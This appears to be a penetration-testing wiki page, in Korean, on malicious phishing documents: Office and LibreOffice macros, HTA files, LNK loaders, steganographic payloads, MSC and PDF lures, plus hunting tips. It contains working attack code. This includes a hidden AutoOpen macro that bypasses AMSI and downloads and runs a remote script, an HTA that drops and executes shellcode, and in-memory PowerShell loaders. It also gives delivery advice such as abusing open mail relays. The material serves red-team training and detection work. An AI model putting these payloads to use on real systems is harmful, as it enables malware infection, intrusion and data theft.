# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터를 검증합니다. 데이터 검증은 OfficeOpenXML 표준에 따라 데이터 구조를 식별하는 방식으로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면 분석 중인 파일이 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 하지만 파일 확장자를 변경해 파일 이름을 바꾸더라도 매크로 실행 기능은 그대로 유지할 수 있습니다.\
예를 들어 RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일의 이름을 RTF로 변경하면 Microsoft Word에서 해당 파일을 처리하며 매크로를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite의 모든 software(Excel, PowerPoint 등)에 적용됩니다.

다음 명령을 사용하면 일부 Office 프로그램에서 실행되는 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 파일에서 원격 템플릿을 참조하는 경우(File –Options –Add-ins –Manage: Templates –Go), 해당 템플릿에 매크로가 포함되어 있으면 매크로도 “실행”할 수 있습니다.

### External Image Load

다음으로 이동합니다: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: 다음으로 이동: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

매크로를 사용하여 문서에서 임의의 코드를 실행할 수 있습니다.

#### Autoload functions

더 일반적으로 사용되는 함수일수록 AV가 탐지할 가능성이 높습니다.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

**File > Info > Inspect Document > Inspect Document**로 이동하면 Document Inspector가 열립니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭합니다.

#### 문서 확장자

완료되면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 Word 97-2003 **`.doc`**로 변경합니다.\
**`.docx`** 파일에는 macro를 저장할 수 **없고**, macro-enabled **`.docm`** 확장자에는 **낙인**이 있기 때문입니다(예: thumbnail icon에 큰 `!`가 표시되고 일부 web/email gateway에서는 이를 완전히 차단함). 따라서 이 **legacy `.doc` 확장자가 가장 좋은 절충안**입니다.

#### 악성 Macro 생성기

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 자동 실행 Macro (Basic)

LibreOffice Writer 문서는 Basic macro를 포함할 수 있으며, macro를 **Open Document** 이벤트에 연결하면 파일이 열릴 때 자동으로 실행할 수 있습니다(Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 간단한 reverse shell macro는 다음과 같습니다:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
문자열 내부의 큰따옴표 두 개(`""`)에 유의하세요. LibreOffice Basic에서는 이를 사용해 리터럴 큰따옴표를 이스케이프하므로, `...==""")`로 끝나는 payload는 내부 command와 Shell argument가 모두 올바르게 균형을 유지합니다.

전달 팁:

- `.odt`로 저장하고 macro를 document event에 연결하여 문서가 열릴 때 즉시 실행되도록 합니다.
- `swaks`로 이메일을 보낼 때는 `--attach @resume.odt`를 사용하세요(`@`가 있어야 파일 이름 문자열이 아니라 파일 bytes가 attachment로 전송됩니다). 이는 검증 없이 임의의 `RCPT TO` recipients를 허용하는 SMTP servers를 악용할 때 중요합니다.

## HTA 파일

HTA는 **HTML과 scripting languages(예: VBScript 및 JScript)를 결합하는** Windows program입니다. 사용자 interface를 생성하고 browser의 security model 제약 없이 "fully trusted" application으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행되며, 일반적으로 **Internet Explorer와 함께 설치**되므로 **`mshta`는 IE에 의존합니다**. 따라서 IE가 제거된 경우 HTA를 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication 강제

**NTLM authentication을 "원격으로" 강제**하는 방법은 여러 가지가 있습니다. 예를 들어 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(HTTP MitM도 가능한가?). 또는 피해자에게 **폴더를 여는 것만으로도** **authentication**을 **trigger**하는 **파일 주소**를 보낼 수 있습니다.

**다음 페이지에서 이러한 아이디어와 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash나 authentication을 훔치는 것뿐만 아니라 **NTLM relay attacks**도 **수행할 수 있다**는 점을 잊지 마세요.

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 캠페인은 합법적인 미끼 문서(PDF/DOCX) 2개와 악성 .lnk가 포함된 ZIP을 전달합니다. 핵심은 실제 PowerShell loader가 고유한 marker 뒤 ZIP의 raw bytes 안에 저장되어 있으며, .lnk가 이를 추출하고 완전히 메모리에서 실행한다는 것입니다.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner로 구현되는 일반적인 흐름:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% 및 현재 working directory의 parent 등 일반적인 경로에서 원본 ZIP을 찾습니다.
2) ZIP bytes를 읽고 hardcoded marker(예: xFIQCV)를 찾습니다. marker 뒤의 모든 내용이 embedded PowerShell payload입니다.
3) ZIP을 %ProgramData%로 복사하고 그곳에서 extract한 다음, 정상적인 파일처럼 보이도록 미끼 .docx를 엽니다.
4) 현재 process에 대해 AMSI를 우회합니다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 stage의 obfuscation을 제거하고(예: 모든 # 문자를 제거) 메모리에서 실행합니다.

embedded stage를 추출하고 실행하는 PowerShell skeleton 예시:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery는 신뢰할 수 있는 PaaS subdomain(예: *.herokuapp.com)을 악용하는 경우가 많으며, payload를 gate할 수 있습니다(IP/UA에 따라 정상적인 ZIP 제공).
- 다음 stage에서는 base64/XOR shellcode를 자주 decrypt한 뒤 Reflection.Emit + VirtualAlloc을 통해 실행하여 disk artifact를 최소화합니다.

같은 chain에서 사용되는 Persistence
- Microsoft Web Browser control의 COM TypeLib hijacking을 사용하여 IE/Explorer 또는 이를 embed하는 모든 app이 payload를 자동으로 다시 실행하도록 합니다.<sup>[[2]](#references)[[4]](#references)</sup> 자세한 내용과 바로 사용할 수 있는 commands는 여기에서 확인할 수 있습니다:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- archive data 끝에 ASCII marker string(예: xFIQCV)이 추가된 ZIP files.
- parent/user folders를 열거하여 ZIP을 찾고 decoy document를 여는 .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed를 통한 AMSI tampering.
- trusted PaaS domains 아래에 host된 links로 끝나는 장시간 실행 business threads.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

또 다른 반복적인 pattern은 **document-impersonating `.lnk`**로, background에서 실제 chain을 stage하는 동시에 정상적인 lure를 즉시 엽니다.<sup>[[3]](#references)</sup>

Observed workflow:
1. Shortcut이 **PDF로 masquerade**하고 conhost.exe 또는 유사한 proxy를 사용하여 obfuscated PowerShell downloader를 spawn합니다.
2. PowerShell은 명백한 tokens(`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`)을 fragment하므로, `iwr`, `gci`, `ren`, `cpi` 또는 `schtasks`를 찾는 단순한 detections는 command를 놓칩니다.
3. Stager는 **decoy document를 먼저 download**하여 victim에게 열어 준 다음, background에서 malicious files를 reconstruct합니다.
4. Payload는 **junk extensions**로 작성된 후 filler characters를 제거하여 rename될 수 있으므로, 명백한 `.exe` / `.cpl` artifacts의 출현이 지연됩니다.
5. User-writable path에서 trusted host binary를 launch하는 **minute-based scheduled task**로 persistence가 설정됩니다.

이 pattern에서 얻을 수 있는 최소한의 hunting 단서:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
인식해 두면 유용한 staging 구조는 다음과 같습니다.
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 두 번째 stage가 은밀한 이유

Rapid7 case study에서 scheduled task는 `C:\Users\Public\`의 **`Fondue.exe`**를 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 그 옆에 staging되어 있고 **`RunFODW`**를 export했기 때문에, trusted Microsoft binary는 정상적인 system copy 대신 attacker의 CPL을 side-load했습니다.

CPL은 다음을 수행합니다.
- `C:\Windows\Tasks\editor.dat`에서 **AES-256-CBC** blob을 읽음
- **Windows CNG / `bcrypt.dll`**을 통해 이를 decrypt함
- executable memory를 할당하고 decrypt된 shellcode를 복사함
- shellcode pointer를 **`EnumUILanguagesW`**의 callback으로 전달하여 간접적으로 실행함

마지막 단계는 별도로 hunting할 가치가 있습니다. malware는 직접적인 `((void(*)())buf)()` jump를 피하고, 대신 **legitimate callback-taking WinAPI**를 악용하여 execution을 전 transfer하는 경우가 많습니다.

이 campaign에서 decrypt된 payload는 **Donut** shellcode였습니다. 이후 최종 PE를 완전히 memory에서 map하고, execution을 넘기기 전에 현재 process에서 **AMSI/WLDP/ETW**를 patch했습니다. side-loading 및 memory-resident post-processing에 대한 자세한 내용은 다음을 참조하세요.

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실제 hunting pivot:
- `.lnk`가 `powershell.exe` 또는 `conhost.exe`를 spawn한 뒤 visible decoy document가 나타나는 경우
- **`C:\Users\Public\`**로 short-lived download가 발생한 뒤 nonsense extension에서 즉시 rename되는 경우
- `GoogleErrorReport`와 같이 평범한 이름을 사용하며 **user-writable directories**에서 실행되는 scheduled task
- 동일한 non-system directory에서 **`.cpl` / `.dll`** 파일을 load하는 trusted binary
- **`C:\Windows\Tasks\`** 아래에 기록된 뒤 side-loaded module이 읽는 Base64 text blob

## 이미지에 steganography-delimited payload를 숨기는 방식 (PowerShell stager)

최근 loader chain은 obfuscated JavaScript/VBS를 전달하며, 이 파일은 Base64 PowerShell stager를 decode하고 실행합니다. 해당 stager는 image(대개 GIF)를 download합니다. 이 image에는 고유한 start/end marker 사이의 plain text로 숨겨진 Base64-encoded .NET DLL이 포함됩니다. script는 이러한 delimiter를 검색하고(실제 사례에서 확인된 예: `«<<sudo_png>> … <<sudo_odt>>>»`), 그 사이의 text를 추출한 다음 Base64-decode하여 bytes로 변환하고, assembly를 memory에서 load한 뒤 C2 URL과 함께 알려진 entry method를 invoke합니다.<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → 내장된 Base64를 decode → `-nop -w hidden -ep bypass`를 사용하여 PowerShell stager를 실행함
- Stage 2: PowerShell stager → image를 download하고, marker-delimited Base64를 carve하며, .NET DLL을 memory에서 load한 뒤 C2 URL과 options를 전달하여 해당 method를 호출함(예: VAI)
- Stage 3: Loader가 최종 payload를 retrieve하고 일반적으로 process hollowing을 통해 trusted binary(일반적으로 MSBuild.exe)에 inject함.<sup>[[7]](#references)[[8]](#references)</sup> process hollowing 및 trusted utility proxy execution에 대한 자세한 내용은 다음을 참조하세요.

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

image에서 DLL을 carve하고 memory에서 .NET method를 invoke하는 PowerShell 예시:

<details>
<summary>PowerShell stego payload extractor 및 loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- This is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Marker는 campaign마다 다릅니다.
- assembly를 로드하기 전에 AMSI/ETW bypass와 string deobfuscation이 일반적으로 적용됩니다.
- Hunting: 다운로드한 이미지에서 알려진 delimiter를 scan하고, 이미지에 접근한 직후 Base64 blob을 decoding하는 PowerShell을 식별합니다.

stego tools와 carving techniques도 참조하세요:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

반복적으로 관찰되는 initial stage는 archive 내부에 전달되는 작고 heavily-obfuscated된 `.js` 또는 `.vbs`입니다. 유일한 목적은 내장된 Base64 string을 decoding하고 `-nop -w hidden -ep bypass`를 사용해 PowerShell을 실행하여 HTTPS를 통해 다음 stage를 bootstrap하는 것입니다.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- 자체 file contents 읽기
- junk strings 사이에서 Base64 blob 찾기
- ASCII PowerShell로 decoding
- `wscript.exe`/`cscript.exe`를 사용해 `powershell.exe` 호출 및 실행

Hunting cues
- command line에서 `-enc`/`FromBase64String`과 함께 `powershell.exe`를 spawn하는 archived JS/VBS attachments.
- user temp paths에서 `powershell.exe -nop -w hidden`을 launch하는 `wscript.exe`.

## MSC documents as execution containers (GrimResource)

Microsoft Management Console files (`.msc`)는 일반적으로 `mmc.exe`로 열리는 XML console definitions입니다. **GrimResource**는 오래된 XSS primitive가 포함된 `apds.dll` resource에 대한 `StringTable` reference를 weaponize하여, 사용자가 crafted console을 열면 `mmc.exe` 내부에서 JavaScript가 실행되도록 합니다. 관찰된 samples는 `transformNode` 기반 obfuscation과 **DotNetToJScript**를 결합하여 일반적인 Office-macro path 없이 .NET payload를 instantiate했습니다.<sup>[[9]](#references)</sup>

Static triage에서는 신뢰할 수 없는 MSC를 text로 취급하고 절대 double-click하지 마세요:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
High-signal runtime pivot은 `mmc.exe`가 CLR 또는 script components를 로드하거나, network connections을 생성하거나, `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` 또는 예상치 못한 executable을 실행하는 경우입니다. 이 형식 자체는 정상적이므로, 모든 MSC를 차단하는 대신 탐지는 **origin + 의심스러운 XML/script content + `mmc.exe` behavior**를 상호 연관해야 합니다.<sup>[[9]](#references)</sup>

## PDF/QR redirectors 및 payload gating

PDF는 유용하게 사용되기 위해 exploit이 필요하지 않습니다. 최근 campaign에서는 정상적으로 보이는 문서에 **QR code 또는 일반 link**를 삽입하고, browser session을 mail controls에서 벗어나게 한 다음, recipient address를 사용해 destination을 개인화합니다. Microsoft는 2025년에 QR URL이 recipient별로 고유하며 RaccoonO365 credential-harvesting infrastructure로 연결되는 PDF를 documented했습니다. 이와 병행된 chain에서는 IP/environment gating을 사용해 선택된 visitor에게는 JavaScript/MSI path를 반환하고, scanner 또는 허용되지 않은 client에는 정상적인 PDF를 반환했습니다.<sup>[[10]](#references)</sup>

PDF actions와 렌더링된 QR code를 모두 triage하세요. QR은 extract 가능한 image로 저장되지 않고 vector로 그려질 수 있으므로, embedded images를 추출하는 것뿐 아니라 모든 page를 rasterize하세요:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
격리된 분석 시스템에서 인증하지 않고 디코딩된 목적지와 redirect를 검사합니다. 유용한 hunting 기능으로는 본문이 거의 비어 있고 QR만 포함된 PDF, query parameter에 삽입된 수신자 이메일, 신뢰할 수 있는 hosting을 통한 여러 redirect, 그리고 IP, geolocation, cookies, referrer 또는 user agent에 따라 다르게 반환되는 콘텐츠가 있습니다. 단일 sandbox fetch에서는 decoy만 수신할 수 있으므로 제어된 프로필을 사용해 요청을 비교합니다.<sup>[[10]](#references)</sup>

## NTLM hashes를 탈취할 Windows 파일

**NTLM creds를 탈취할 수 있는 위치** 페이지를 확인합니다:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: 미국 기업을 표적으로 삼은 정교한 Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-Themed Loader Chain을 통한 Dropping Elephant Tradecraft 추적](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 새로운 COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader가 다양한 Infostealer를 전달](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: initial access 및 evasion을 위한 Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors가 tax season을 악용해 tax-themed phishing campaigns를 배포](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
